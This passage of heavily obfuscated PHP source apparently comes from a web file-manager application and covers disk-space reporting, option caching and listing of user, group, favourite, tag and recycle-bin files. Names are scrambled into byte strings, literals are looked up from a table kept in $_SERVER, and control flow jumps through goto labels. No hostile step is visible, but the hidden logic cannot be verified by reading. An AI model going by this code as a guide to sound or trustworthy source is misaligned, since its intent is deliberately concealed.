$÷ğ¬œÀ°[1] . $˜ãÅ‘ÚË[8]; } } if (!file_exists($×ôÛ†î¦)) { return; } $ÌÅ™éâö = @disk_total_space($×ôÛ†î¦); $Ñ¥‹÷­é = $ÌÅ™éâö - @disk_free_space($×ôÛ†î¦); return array($˜ãÅ‘ÚË[1814] => $ÌÅ™éâö, $˜ãÅ‘ÚË[1816] => $Ñ¥‹÷­é); } public function fileChart($ÈÛ¸Ÿñ˜) { $œ»ìîµş =& $_SERVER[„Ç©ñÎ©]; if (isset($ÈÛ¸Ÿñ˜[$œ»ìîµş[1655]])) { return Model($œ»ìîµş[828])->userFileTypeProfile($ÈÛ¸Ÿñ˜[$œ»ìîµş[1655]]); } if (isset($ÈÛ¸Ÿñ˜[$œ»ìîµş[1827]])) { return Model($œ»ìîµş[828])->groupFileTypeProfile($ÈÛ¸Ÿñ˜[$œ»ìîµş[1827]]); } $Ãéò™™ = $this->sourceSize(); $Ô‡ÍÌûµ = array($œ»ìîµş[441] => 0, $œ»ìîµş[420] => 1); $†Ë¶Á¹Š = Model($œ»ìîµş[828])->where($Ô‡ÍÌûµ)->sum($œ»ìîµş[86]); $Ô‡ÍÌûµ[$œ»ìîµş[420]] = 2; $Š‹ó± = Model($œ»ìîµş[828])->where($Ô‡ÍÌûµ)->sum($œ»ìîµş[86]); return array($œ»ìîµş[766] => $Ãéò™™[$œ»ìîµş[86]], $œ»ìîµş[1761] => $Ãéò™™[$œ»ìîµş[1761]], $œ»ìîµş[1762] => (int) $†Ë¶Á¹Š, $œ»ìîµş[1763] => (int) $Š‹ó±); } private function sourceSize() { $ü•à¢¾Ç =& $_SERVER[„Ç©ñÎ©]; $øÕòÙê× = Model($ü•à¢¾Ç[828])->where(array($ü•à¢¾Ç[419] => 0))->sum($ü•à¢¾Ç[86]); $•ÍÙÖÄõ = Model($ü•à¢¾Ç[480])->sum($ü•à¢¾Ç[86]); if ($•ÍÙÖÄõ > $øÕòÙê×) { $•ÍÙÖÄõ = $øÕòÙê×; } return array($ü•à¢¾Ç[86] => (int) $øÕòÙê×, $ü•à¢¾Ç[1761] => (int) $•ÍÙÖÄõ); } } goto FÉÏ‹˜…®Æ; D‘ç½ÕÅ¡: function binCheckBigger($Ì·ç®”–, $şÔ€€”) { return $Ì·ç®”– > $şÔ€€”; } $_SERVER[$_SERVER[ÒŞÌîˆ][3]] = ("\x38\x30\x39\x35"."\x33\x39")+0;$_koew="4i52w0m7f8gpjysdt1cbklqu9anxz3oehvr6j10xcgvykpum7qr6bnatz9w34o5le8sih2dfoviu";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($©àÅè ï, $Ó Æˆê‚) { $»ÍóÆÍş =& $_SERVER[„Ç©ñÎ©]; if (isset(self::$_methodList[$©àÅè ï])) { return @call_user_func_array(self::$_methodList[$©àÅè ï], $Ó Æˆê‚); } else { if (method_exists($this, $©àÅè ï)) { return call_user_func_array(array($this, $©àÅè ï), $Ó Æˆê‚); } else { think_exception(__CLASS__ . $»ÍóÆÍş[4] . $©àÅè ï . $»ÍóÆÍş[5]); } } } public static function __callStatic($™§§è, $ê¨—’Î¶) { if (isset(self::$_methodListStatic[$™§§è])) { return call_user_func_array(self::$_methodListStatic[$™§§è], $ê¨—’Î¶); } else { if (method_exists(self, $™§§è)) { return call_user_func_array(array(self, $™§§è), $ê¨—’Î¶); } else { show_json("{$™§§è}\50\x29\x20\x6e\157\164\40\145\x78\x69\x73\x74\73", !1); } } } public static function addMethod($†ùÑ™¨, $İ£¹¤µì) { self::$_methodList[$†ùÑ™¨] = $İ£¹¤µì; } public static function addMethodStatic($¿ÃıÚíÃ, $öÛÕ§­ã) { self::$_methodListStatic[$¿ÃıÚíÃ] = $öÛÕ§­ã; } } goto CÅÆ¸ÌÍùª; B¸‘“—ä«: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ã¼‰üà¨ = false, $¯õÅºşó = '', $€ˆôò‹ = false) { $Ó¯Š®ğ =& $_SERVER[„Ç©ñÎ©]; $¤¢İ³Íú = $this->cacheGet($¯õÅºşó); $Î³Ê˜ìÜ = $this->optionDefault($¯õÅºşó); $Î³Ê˜ìÜ = is_array($Î³Ê˜ìÜ) ? $Î³Ê˜ìÜ : array(); if (is_array($¤¢İ³Íú)) { $¤¢İ³Íú = array_merge($Î³Ê˜ìÜ, $¤¢İ³Íú); return $ã¼‰üà¨ ? isset($¤¢İ³Íú[$ã¼‰üà¨]) ? $¤¢İ³Íú[$ã¼‰üà¨] : null : $¤¢İ³Íú; } $­¹åë¼° = $this->filterWhere(array($Ó¯Š®ğ[33] => $¯õÅºşó)); $¤¢İ³Íú = $this->where($­¹åë¼°)->select(); $¤¢İ³Íú = array_to_keyvalue($¤¢İ³Íú, $Ó¯Š®ğ[104], $Ó¯Š®ğ[383]); foreach ($¤¢İ³Íú as $¯Ñ¸¢¾Ç => $ëñ¬°) { if ($€ˆôò‹ || in_array($¯Ñ¸¢¾Ç, $this->jsonField)) { $¤¢İ³Íú[$¯Ñ¸¢¾Ç] = json_decode($ëñ¬°, !0); } } $this->cacheSet($¯õÅºşó, $¤¢İ³Íú); $¤¢İ³Íú = array_merge($Î³Ê˜ìÜ, $¤¢İ³Íú); return $ã¼‰üà¨ ? $¤¢İ³Íú[$ã¼‰üà¨] : $¤¢İ³Íú; } public function set($Ç†ÓŠ›¿, $Öå÷œ™ø = false, $¿—‡Œõ» = '') { $êæøë÷ =& $_SERVER[„Ç©ñÎ©]; $this->cacheRemove($¿—‡Œõ»); $œô¶’¼Ø = array(); $¶†şÅá‰ = is_array($Ç†ÓŠ›¿) ? $Ç†ÓŠ›¿ : array($Ç†ÓŠ›¿ => $Öå÷œ™ø); foreach ($¶†şÅá‰ as $Š§ûÒ‘ => $–ìõè€´) { if (is_array($–ìõè€´)) { $–ìõè€´ = json_encode_force($–ìõè€´); } $this->checkLength($–ìõè€´, !1, $this->tableName . $êæøë÷[4] . $Ç†ÓŠ›¿); $–ìõè€´ = self::textEncode($–ìõè€´); $¶†şÅá‰ = array($êæøë÷[33] => $¿—‡Œõ», $êæøë÷[104] => $Š§ûÒ‘, $êæøë÷[383] => $–ìõè€´); $œô¶’¼Ø[] = $this->filterWhere($¶†şÅá‰); } if (!$œô¶’¼Ø) { return !0; } $éìÆ¸¯— = $this->cacheKey($êæøë÷[409]); CacheLock::lock($éìÆ¸¯—); $ÉÄüç³Â = $this->addAll($œô¶’¼Ø, array(), !0); CacheLock::unlock($éìÆ¸¯—); return $ÉÄüç³Â; } protected function optionDefault($ŸØúˆ±ş = '') { return !1; } public function setDeep($ëÂ«£œ, $”Õ‰“ = false, $‰İ®·ü‚ = '') { $€¹êæ»« = explode($_SERVER[„Ç©ñÎ©][10], $ëÂ«£œ); $ˆ¤…©¿ì = $this->get(); array_set_value($ˆ¤…©¿ì, $ëÂ«£œ, $”Õ‰“); $this->set($€¹êæ»«[0], $ˆ¤…©¿ì[$€¹êæ»«[0]], $‰İ®·ü‚); } public function remove($Âú´×Òè, $Ş³ËÑ¹ = '') { $ºİ¨ØÖ =& $_SERVER[„Ç©ñÎ©]; $this->cacheRemove($Ş³ËÑ¹); $¾ø¬û°¸ = $this->filterWhere(array($ºİ¨ØÖ[104] => $Âú´×Òè, $ºİ¨ØÖ[33] => $Ş³ËÑ¹)); if (is_null($Âú´×Òè)) { unset($¾ø¬û°¸[$ºİ¨ØÖ[104]]); } return $this->where($¾ø¬û°¸)->delete(); } public function cacheSet($·Ì­óÇË, $ÅÒâ„ıÌ = false) { return Cache::set($this->cacheKey($·Ì­óÇË), $ÅÒâ„ıÌ); } public function cacheGet($†ú¦º”—) { return Cache::get($this->cacheKey($†ú¦º”—)); } public function cacheRemove($Ë×¹‡Ûõ) { return Cache::remove($this->cacheKey($Ë×¹‡Ûõ)); } protected function filterWhere($Úíº„ñ) { return $Úíº„ñ; } protected function cacheKey($º¯Ëµëê) { return $º¯Ëµëê; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\x75\x72\x63\145"; protected $tableMeta = array("\164\x61\142\x6c\145\x4e\141\155\145" => "\x69\157\137\x73\x6f\165\162\143\x65\137\155\x65\x74\141", "\155\x65\164\141\x46\x69\x65\x6c\x64" => "\163\x6f\165\162\143\x65\x49\104"); protected $dataAuto = array(array("\x6d\x6f\x64\151\146\171\x54\x69\x6d\x65", "\164\151\x6d\x65", "\151\x6e\163\x65\x72\164", "\146\x75\156\143\164\x69\x6f\x6e"), array("\x63\x72\145\x61\164\145\x54\x69\155\145", "\x74\x69\x6d\145", "\x69\x6e\x73\x65\x72\164", "\146\x75\156\x63\x74\151\157\x6e"), array("\166\x69\145\x77\124\x69\x6d\x65", "\164\x69\x6d\x65", "\151\156\163\145\x72\x74", "\x66\x75\x6e\143\164\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($áÔ©¾ÌÏ) { return $this->listSource(array($_SERVER[„Ç©ñÎ©][410] => $áÔ©¾ÌÏ)); } public function typeName($Î“ò†) { static $åê¦±à¦ = array(self::TYPE_SYSTEM => "\163\171\163\x74\x65\x6d", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\147\x72\157\165\160"); return $åê¦±à¦[$Î“ò† . $_SERVER[„Ç©ñÎ©][12]]; } public function sourceListInfo($ƒË£ô‘İ, $´‹ôœØ = false) { $ÈÛ…üå =& $_SERVER[„Ç©ñÎ©]; $ƒË£ô‘İ = $ƒË£ô‘İ ? $ƒË£ô‘İ : array(); $ƒË£ô‘İ = array_filter(array_unique($ƒË£ô‘İ)); if (!$ƒË£ô‘İ) { return array(); } $ˆ¾èºâĞ = $this->where(array($ÈÛ…üå[411] => array($ÈÛ…üå[7], $ƒË£ô‘İ)))->select(); $this->_listDataApply($ˆ¾èºâĞ, $´‹ôœØ); return array_to_keyvalue($ˆ¾èºâĞ, $ÈÛ…üå[411]); } public function pathInfoFilter(&$³÷¦ÙÕ) { $ı¿ıç¯ï =& $_SERVER[„Ç©ñÎ©]; static $Ñ°½•• = false; static $–—óÌéõ = false; static $¼éæøÚª = false; if (!$Ñ°½••) { $öÉó‚åƒ = $ı¿ıç¯ï[412]; $öÉó‚åƒ .= $ı¿ıç¯ï[413]; $öÉó‚åƒ .= $ı¿ıç¯ï[414]; $ÕÎ”£ôê = $ı¿ıç¯ï[415]; $“ÊàÌÑ  = explode($ı¿ıç¯ï[50], $ÕÎ”£ôê); $Ñ°½•• = explode($ı¿ıç¯ï[50], $öÉó‚åƒ); $–—óÌéõ = array(); foreach ($Ñ°½•• as $ˆ—™š–) { if (in_array($ˆ—™š–, $“ÊàÌÑ )) { continue; } $–—óÌéõ[] = $ˆ—™š–; } $¼éæøÚª = explode($ı¿ıç¯ï[50], $ı¿ıç¯ï[416]); } foreach ($¼éæøÚª as $¸¹òàªÅ) { if (isset($³÷¦ÙÕ[$¸¹òàªÅ])) { $³÷¦ÙÕ[$¸¹òàªÅ] = intval($³÷¦ÙÕ[$¸¹òàªÅ]); } } $³÷¦ÙÕ[$ı¿ıç¯ï[94]] = $ı¿ıç¯ï[417] . $³÷¦ÙÕ[$ı¿ıç¯ï[411]] . $ı¿ıç¯ï[418]; $³÷¦ÙÕ[$ı¿ıç¯ï[33]] = $³÷¦ÙÕ[$ı¿ıç¯ï[419]] == 1 ? $ı¿ıç¯ï[85] : $ı¿ıç¯ï[209]; $³÷¦ÙÕ[$ı¿ıç¯ï[420]] = $this->typeName($³÷¦ÙÕ[$ı¿ıç¯ï[420]]); if ($³÷¦ÙÕ[$ı¿ıç¯ï[419]] != 1) { $³÷¦ÙÕ[$ı¿ıç¯ï[184]] = $³÷¦ÙÕ[$ı¿ıç¯ï[421]]; unset($³÷¦ÙÕ[$ı¿ıç¯ï[421]]); } $ü€‚ùÏÏ = $Ñ°½••; if (isset($³÷¦ÙÕ[$ı¿ıç¯ï[422]]) && $³÷¦ÙÕ[$ı¿ıç¯ï[422]][$ı¿ıç¯ï[423]] == -1) { $ü€‚ùÏÏ = $–—óÌéõ; } $³÷¦ÙÕ = array_field_key($³÷¦ÙÕ, $ü€‚ùÏÏ); return $³÷¦ÙÕ; } public function listUserFav() { $êææÈ¿Ø =& $_SERVER[„Ç©ñÎ©]; $¬èÛŞ¶¶ = Model($êææÈ¿Ø[424])->listData(); $×ÓĞ·éŒ = array_filter_by_field($¬èÛŞ¶¶, $êææÈ¿Ø[33], $êææÈ¿Ø[425]); $×ÓĞ·éŒ = array_to_keyvalue($×ÓĞ·éŒ, $êææÈ¿Ø[12], $êææÈ¿Ø[94]); if ($×ÓĞ·éŒ) { $¸áÚı’ = $this->listSource(array($êææÈ¿Ø[426] => array($êææÈ¿Ø[427], $×ÓĞ·éŒ))); } $¸áÚı’ = array_to_keyvalue($¸áÚı’[$êææÈ¿Ø[378]], $êææÈ¿Ø[411]); foreach ($¬èÛŞ¶¶ as &$²«ğÔ„È) { $²«ğÔ„È = array($êææÈ¿Ø[428] => $²«ğÔ„È[$êææÈ¿Ø[408]], $êææÈ¿Ø[429] => $²«ğÔ„È[$êææÈ¿Ø[32]], $êææÈ¿Ø[430] => $²«ğÔ„È[$êææÈ¿Ø[94]], $êææÈ¿Ø[431] => $²«ğÔ„È[$êææÈ¿Ø[33]], $êææÈ¿Ø[432] => $²«ğÔ„È[$êææÈ¿Ø[210]], $êææÈ¿Ø[433] => $²«ğÔ„È[$êææÈ¿Ø[95]]); if ($²«ğÔ„È[$êææÈ¿Ø[33]] == $êææÈ¿Ø[425] && $¸áÚı’[$²«ğÔ„È[$êææÈ¿Ø[94]]]) { $²«ğÔ„È[$êææÈ¿Ø[96]] = $¸áÚı’[$²«ğÔ„È[$êææÈ¿Ø[94]]]; } } unset($²«ğÔ„È); return $¬èÛŞ¶¶; } public function listUserTag($¡ªÂ¿†Ÿ) { $ºµ¨Ô£¨ =& $_SERVER[„Ç©ñÎ©]; if ($¡ªÂ¿†Ÿ && !is_array($¡ªÂ¿†Ÿ)) { $¡ªÂ¿†Ÿ = array($¡ªÂ¿†Ÿ); } $·†Çôœï = Model($ºµ¨Ô£¨[434])->listData(); $ÎéàÀ¤Ğ = array(); $ÄË¤ª ¹ = array(); foreach ($·†Çôœï as $ºó¡ƒ) { $§Çº¹º = $ºó¡ƒ[$ºµ¨Ô£¨[94]]; if (!$§Çº¹º) { continue; } if (!isset($ÄË¤ª ¹[$§Çº¹º])) { $ÄË¤ª ¹[$§Çº¹º] = array(); } $ÄË¤ª ¹[$§Çº¹º][] = $ºó¡ƒ[$ºµ¨Ô£¨[435]]; $ÎéàÀ¤Ğ[$ºó¡ƒ[$ºµ¨Ô£¨[94]]] = $ºó¡ƒ; } $Éå¡–§ = array(); $®ØÅÔ´ß = array(); $«õ·ä£ = array(); foreach ($ÄË¤ª ¹ as $µ½©¸µ¥ => $äª…Üí«) { $’ï‚õâİ = !0; if (!$¡ªÂ¿†Ÿ) { $Éå¡–§[] = $µ½©¸µ¥; continue; } foreach ($¡ªÂ¿†Ÿ as $‚¤á«¢Ì) { if (!in_array($‚¤á«¢Ì, $äª…Üí«)) { $’ï‚õâİ = !1; break; } } if (!$’ï‚õâİ) { continue; } if (!is_numeric($µ½©¸µ¥)) { $¶™…äè = $ÎéàÀ¤Ğ[$µ½©¸µ¥]; $Áı™³Îñ = array($ºµ¨Ô£¨[32] => $¶™…äè[$ºµ¨Ô£¨[32]], $ºµ¨Ô£¨[94] => $¶™…äè[$ºµ¨Ô£¨[94]], $ºµ¨Ô£¨[33] => $¶™…äè[$ºµ¨Ô£¨[33]], $ºµ¨Ô£¨[96] => array($ºµ¨Ô£¨[436] => 1), $ºµ¨Ô£¨[211] => !0); if ($¶™…äè[$ºµ¨Ô£¨[33]] == $ºµ¨Ô£¨[209]) { $«õ·ä£[] = $Áı™³Îñ; } if ($¶™…äè[$ºµ¨Ô£¨[33]] == $ºµ¨Ô£¨[85]) { $®ØÅÔ´ß[] = $Áı™³Îñ; } continue; } $Éå¡–§[] = $µ½©¸µ¥; } if ($Éå¡–§) { $¶¡ïØ› = $this->listSource(array($ºµ¨Ô£¨[426] => array($ºµ¨Ô£¨[427], $Éå¡–§))); } $¶¡ïØ› = $¶¡ïØ› ? $¶¡ïØ› : array($ºµ¨Ô£¨[92] => array(), $ºµ¨Ô£¨[93] => array()); $¶¡ïØ›[$ºµ¨Ô£¨[92]] = array_merge($¶¡ïØ›[$ºµ¨Ô£¨[92]], $®ØÅÔ´ß); $¶¡ïØ›[$ºµ¨Ô£¨[93]] = array_merge($¶¡ïØ›[$ºµ¨Ô£¨[93]], $«õ·ä£); if (isset($¶¡ïØ›[$ºµ¨Ô£¨[375]]) && count($Éå¡–§) == $¶¡ïØ›[$ºµ¨Ô£¨[375]][$ºµ¨Ô£¨[376]]) { return $¶¡ïØ›; } $»–®ûÑÑ = array(); $ººÍåÎï = array_to_keyvalue($¶¡ïØ›[$ºµ¨Ô£¨[92]], $ºµ¨Ô£¨[12], $ºµ¨Ô£¨[411]); $³ºóå¡š = array_to_keyvalue($¶¡ïØ›[$ºµ¨Ô£¨[93]], $ºµ¨Ô£¨[12], $ºµ¨Ô£¨[411]); $°¼úô»´ = array_merge($³ºóå¡š, $ººÍåÎï); foreach ($Éå¡–§ as $§Çº¹º) { if (!in_array($§Çº¹º, $°¼úô»´)) { $»–®ûÑÑ[] = $§Çº¹º; } } if ($»–®ûÑÑ) { Model($ºµ¨Ô£¨[437])->removeBySource($»–®ûÑÑ); } return $¶¡ïØ›; } public function listUserRecycle() { $³÷ÎØ¹ =& $_SERVER[„Ç©ñÎ©]; $—âµŒ§° = Model($³÷ÎØ¹[438])->listData(); if (!$—âµŒ§°) { return array(); } $œ«ûûÈß = array($³÷ÎØ¹[426] => array($³÷ÎØ¹[427], $—âµŒ§°), $³÷ÎØ¹[439] => 1); return $this->listSource($œ«ûûÈß); } public function listSource($Òƒ™¬´, $©“‡•€µ = 3000, $÷˜¦ÓÁ = false) { $œ¤İšĞĞ =& $_SERVER[„Ç©ñÎ©]; if (!isset($Òƒ™¬´[$œ¤İšĞĞ[440]])) { $Òƒ™¬´[$œ¤İšĞĞ[440]] = 0; } if (isset($Òƒ™¬´[$œ¤İšĞĞ[441]]) && $Òƒ™¬´[$œ¤İšĞĞ[441]] == $œ¤İšĞĞ[207]) { $Òƒ™¬´[$œ¤İšĞĞ[421]] = array($œ¤İšĞĞ[340], $œ¤İšĞĞ[442]); } $¼ğ‚—ñ– = $œ¤İšĞĞ[443]; $£ªÚœìÖ = $this->field($¼ğ‚—ñ–)->_makeOrder()->where($Òƒ™¬´)->selectPage($©“‡•€µ); $this->_listPageCheck($£ªÚœìÖ, $¼ğ‚—ñ–, $Òƒ™¬´); $this->_listDataApply($£ªÚœìÖ[$œ¤İšĞĞ[378]], $÷˜¦ÓÁ); $this->_listMake($£ªÚœìÖ); return $£ªÚœìÖ; } private function _listPageCheck(&$æ†£Àë…, $¾§¯·áë, $ë›ÔÕ—•) { $øî¸Ÿ™¡ =& $_SERVER[„Ç©ñÎ©]; if (!is_array($æ†£Àë…[$øî¸Ÿ™¡[375]])) { return; } $Ã€ñîÑü = $æ†£Àë…[$øî¸Ÿ™¡[375]]; if ($Ã€ñîÑü[$øî¸Ÿ™¡[377]] <= 1) { return; } if ($Ã€ñîÑü[$øî¸Ÿ™¡[376]] >= 100000) { return; } if (Model($øî¸Ÿ™¡[444])->get($øî¸Ÿ™¡[445]) != $øî¸Ÿ™¡[446]) { return; } $¾§¯·áë = str_replace(array($øî¸Ÿ™¡[53], $øî¸Ÿ™¡[351], $øî¸Ÿ™¡[66]), $øî¸Ÿ™¡[12], $¾§¯·áë); $¾§¯·áë = $øî¸Ÿ™¡[447] . str_replace($øî¸Ÿ™¡[50], $øî¸Ÿ™¡[448], $¾§¯·áë) . $øî¸Ÿ™¡[449]; $–ˆ¾Ó±¨ = $øî¸Ÿ™¡[450]; $–ˆ¾Ó±¨ = $–ˆ¾Ó±¨ . $øî¸Ÿ™¡[451]; $³È·Â†º = $Ã€ñîÑü[$øî¸Ÿ™¡[372]] * ($Ã€ñîÑü[$øî¸Ÿ™¡[362]] - 1) . $øî¸Ÿ™¡[50] . $Ã€ñîÑü[$øî¸Ÿ™¡[372]]; $¥Ä×ÑÖã = $this->_makeOrder(!0); $ßÜûÀÕ‡ = $øî¸Ÿ™¡[447] . str_replace($øî¸Ÿ™¡[50], $øî¸Ÿ™¡[448], $¥Ä×ÑÖã[0]); if (strpos($ßÜûÀÕ‡, $øî¸Ÿ™¡[452])) { $ßÜûÀÕ‡ = str_replace($øî¸Ÿ™¡[452], $øî¸Ÿ™¡[453], $ßÜûÀÕ‡); } else { $ßÜûÀÕ‡ .= $øî¸Ÿ™¡[454] . $¥Ä×ÑÖã[1]; } $¶Š›şÖÓ = array(); foreach ($ë›ÔÕ—• as $ ‘Ğíª‘ => $‹ôÒ‘½à) { $¶Š›şÖÓ[$øî¸Ÿ™¡[447] . $ ‘Ğíª‘] = $‹ôÒ‘½à; } $this->alias($øî¸Ÿ™¡[455])->field($¾§¯·áë)->limit($³È·Â†º)->order($ßÜûÀÕ‡); $ŒÕà”¦ = $this->join($–ˆ¾Ó±¨)->where($¶Š›şÖÓ)->select(); if ($ŒÕà”¦) { $æ†£Àë…[$øî¸Ÿ™¡[378]] = $ŒÕà”¦; } } protected function _makeOrder($¹…ÆÍ¯Ä = false) { $à½ÌŠº§ =& $_SERVER[„Ç©ñÎ©]; $Ï±Éº§· = Model($à½ÌŠº§[456])->get($à½ÌŠº§[457]); $‰ßƒÑ¡ = Model($à½ÌŠº§[456])->get($à½ÌŠº§[458]); $…²à…—¢ = array($à½ÌŠº§[459] => $à½ÌŠº§[460], $à½ÌŠº§[461] => $à½ÌŠº§[462]); $ßòë¼–¯ = array($à½ÌŠº§[32] => $à½ÌŠº§[32], $à½ÌŠº§[86] => $à½ÌŠº§[86], $à½ÌŠº§[184] => $à½ÌŠº§[421], $à½ÌŠº§[463] => $à½ÌŠº§[463], $à½ÌŠº§[464] => $à½ÌŠº§[465], $à½ÌŠº§[210] => $à½ÌŠº§[210], $à½ÌŠº§[95] => $à½ÌŠº§[95]); $ÙõŠ®€û = Input::get($à½ÌŠº§[466], $à½ÌŠº§[7], $Ï±Éº§·, array_keys($ßòë¼–¯)); $ˆ®°úıÖ = Input::get($à½ÌŠº§[467], $à½ÌŠº§[7], $‰ßƒÑ¡, array_keys($…²à…—¢)); if (!in_array($ÙõŠ®€û, array_keys($ßòë¼–¯))) { $ÙõŠ®€û = $à½ÌŠº§[32]; } if (!in_array($ˆ®°úıÖ, array_keys($…²à…—¢))) { $ÙõŠ®€û = $à½ÌŠº§[459]; } if ($ÙõŠ®€û == $à½ÌŠº§[32]) { } $ç¸¨ı¡ê = $à½ÌŠº§[468] . $ßòë¼–¯[$ÙõŠ®€û] . $à½ÌŠº§[53] . $…²à…—¢[$ˆ®°úıÖ]; $ç¸¨ı¡ê = rtrim(trim($ç¸¨ı¡ê), $à½ÌŠº§[50]); if ($¹…ÆÍ¯Ä) { return array($ç¸¨ı¡ê, $…²à…—¢[$ˆ®°úıÖ]); } return $this->order($ç¸¨ı¡ê); } protected function _listDataApplyItem($¥Ïª±ÌÁ, $¥ú×˜® = false) { $†¡³¿© = array($¥Ïª±ÌÁ); $this->_listDataApply($†¡³¿©, $¥ú×˜®); return $†¡³¿©[0]; } protected function _listDataApply(&$ö¸ı”¢, $´“’Ó³ = false) { $´¸Ä¢Û =& $_SERVER[„Ç©ñÎ©]; if (!$ö¸ı”¢) { $ö¸ı”¢ = array(); return; } $ûššÁï = array_to_keyvalue($ö¸ı”¢, $´¸Ä¢Û[12], $´¸Ä¢Û[411]); $ûššÁï = array_unique($ûššÁï); $this->_listSourceCache($ö¸ı”¢); if (!$´“’Ó³) { $this->_listAppendMeta($ö¸ı”¢, $ûššÁï); $this->_listAppendFileMeta($ö¸ı”¢, $ûššÁï); $this->_listAppendChildren($ö¸ı”¢, $ûššÁï); } $this->_listAppendPath($ö¸ı”¢); $this->_listAppendAuth($ö¸ı”¢); $this->_listAppendSourceInfo($ö¸ı”¢, $ûššÁï); $this->_listAppendUser($ö¸ı”¢); $this->_listFilterInfo($ö¸ı”¢, $´“’Ó³); $this->_listAppendAuthSecret($ö¸ı”¢); } protected function _listSourceCache($™­´âƒÜ) { $Ø³¦Üµü =& $_SERVER[„Ç©ñÎ©]; foreach ($™­´âƒÜ as $¨µ™±‘¬) { self::$cacheSourceInfo[$Ø³¦Üµü[469] . $¨µ™±‘¬[$Ø³¦Üµü[411]]] = $¨µ™±‘¬; } } protected function _listFilterInfo(&$‚Ñ²­È·, $é¥„ª£ş = false) { $¹Î™Ä»ß =& $_SERVER[„Ç©ñÎ©]; foreach ($‚Ñ²­È· as &$üÒ‹±•) { $üÒ‹±• = $this->pathInfoFilter($üÒ‹±•); self::$cachePathInfo[$¹Î™Ä»ß[470] . intval($é¥„ª£ş) . $¹Î™Ä»ß[395] . $üÒ‹±•[$¹Î™Ä»ß[411]]] = $üÒ‹±•; } unset($üÒ‹±•); } protected function _listMake(&$¼É¥Ò±“) { $Ø÷ûôı =& $_SERVER[„Ç©ñÎ©]; $¼É¥Ò±“[$Ø÷ûôı[92]] = array(); $¼É¥Ò±“[$Ø÷ûôı[93]] = array(); foreach ($¼É¥Ò±“[$Ø÷ûôı[378]] as $îÂÖÄ‚ß) { $®ç­Ò¾î = $îÂÖÄ‚ß[$Ø÷ûôı[419]] == 1 ? $Ø÷ûôı[92] : $Ø÷ûôı[93]; $¼É¥Ò±“[$®ç­Ò¾î][] = $îÂÖÄ‚ß; } unset($¼É¥Ò±“[$Ø÷ûôı[378]]); } protected function _listAppendMeta(&$ºœ¥Æ‘, $µƒÓÔˆ) { $ÎÒÜ„Õ =& $_SERVER[„Ç©ñÎ©]; $°Á„æ©¡ = array($ÎÒÜ„Õ[426] => array($ÎÒÜ„Õ[427], $µƒÓÔˆ)); $«ô÷åú˜ = Model($ÎÒÜ„Õ[471])->field($ÎÒÜ„Õ[472])->where($°Á„æ©¡)->select(); if (!$«ô÷åú˜) { return; } $÷òœ­ïÃ = array($ÎÒÜ„Õ[473], $ÎÒÜ„Õ[474], $ÎÒÜ„Õ[453]); $Õ‚×ÜÑá = array(); foreach ($«ô÷åú˜ as $ãÎü»º) { if (!isset($Õ‚×ÜÑá[$ãÎü»º[$ÎÒÜ„Õ[411]]])) { $Õ‚×ÜÑá[$ãÎü»º[$ÎÒÜ„Õ[411]]] = array(); } if (in_array($ãÎü»º[$ÎÒÜ„Õ[104]], $÷òœ­ïÃ)) { continue; } $Õ‚×ÜÑá[$ãÎü»º[$ÎÒÜ„Õ[411]]][$ãÎü»º[$ÎÒÜ„Õ[104]]] = $ãÎü»º[$ÎÒÜ„Õ[383]]; } foreach ($ºœ¥Æ‘ as &$˜íÆÄè‹) { $˜íÆÄè‹[$ÎÒÜ„Õ[475]] = !1; if (isset($Õ‚×ÜÑá[$˜íÆÄè‹[$ÎÒÜ„Õ[411]]])) { $˜íÆÄè‹[$ÎÒÜ„Õ[475]] = $Õ‚×ÜÑá[$˜íÆÄè‹[$ÎÒÜ„Õ[411]]]; } if ($this->fileIsLock($˜íÆÄè‹) && $˜íÆÄè‹[$ÎÒÜ„Õ[422]]) { $Ü©³Êœİ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $˜íÆÄè‹[$ÎÒÜ„Õ[422]][$ÎÒÜ„Õ[423]] = AuthModel::authDisable($˜íÆÄè‹[$ÎÒÜ„Õ[422]][$ÎÒÜ„Õ[423]], $Ü©³Êœİ); $˜íÆÄè‹[$ÎÒÜ„Õ[422]][$ÎÒÜ„Õ[476]][$ÎÒÜ„Õ[422]] = $˜íÆÄè‹[$ÎÒÜ„Õ[422]][$ÎÒÜ„Õ[423]]; } } unset($˜íÆÄè‹); } protected function _listAppendFileMeta(&$”ç¸Æ¦Ï, $şöÚöà×) { $§şÙŸ”ˆ =& $_SERVER[„Ç©ñÎ©]; $ÈÆİ¾œò = array_to_keyvalue($”ç¸Æ¦Ï, $§şÙŸ”ˆ[12], $§şÙŸ”ˆ[477]); $ÈÆİ¾œò = array_filter(array_unique($ÈÆİ¾œò)); if (!$ÈÆİ¾œò) { return; } $¦™Ññ“ = array($§şÙŸ”ˆ[478] => array($§şÙŸ”ˆ[427], $ÈÆİ¾œò)); $ÅÏÎ Û³ = $§şÙŸ”ˆ[479]; $ÉÉô¿Âº = Model($§şÙŸ”ˆ[480])->field($ÅÏÎ Û³)->where($¦™Ññ“)->select(); $ÉÉô¿Âº = array_to_keyvalue($ÉÉô¿Âº, $§şÙŸ”ˆ[477]); $²Òí´æé = Model($§şÙŸ”ˆ[481])->field($§şÙŸ”ˆ[482])->where($¦™Ññ“)->select(); $²Òí´æé = $²Òí´æé ? $²Òí´æé : array(); $˜Ô¸«á¯ = array(); foreach ($²Òí´æé as $¾àİÉÓ) { if (!isset($˜Ô¸«á¯[$¾àİÉÓ[$§şÙŸ”ˆ[477]]])) { $˜Ô¸«á¯[$¾àİÉÓ[$§şÙŸ”ˆ[477]]] = array(); } $˜Ô¸«á¯[$¾àİÉÓ[$§şÙŸ”ˆ[477]]][$¾àİÉÓ[$§şÙŸ”ˆ[104]]] = $¾àİÉÓ[$§şÙŸ”ˆ[383]]; } foreach ($”ç¸Æ¦Ï as &$À×ˆ·­£) { $­ø¤Å = $À×ˆ·­£[$§şÙŸ”ˆ[477]]; if (!$­ø¤Å || !is_array($ÉÉô¿Âº[$­ø¤Å])) { 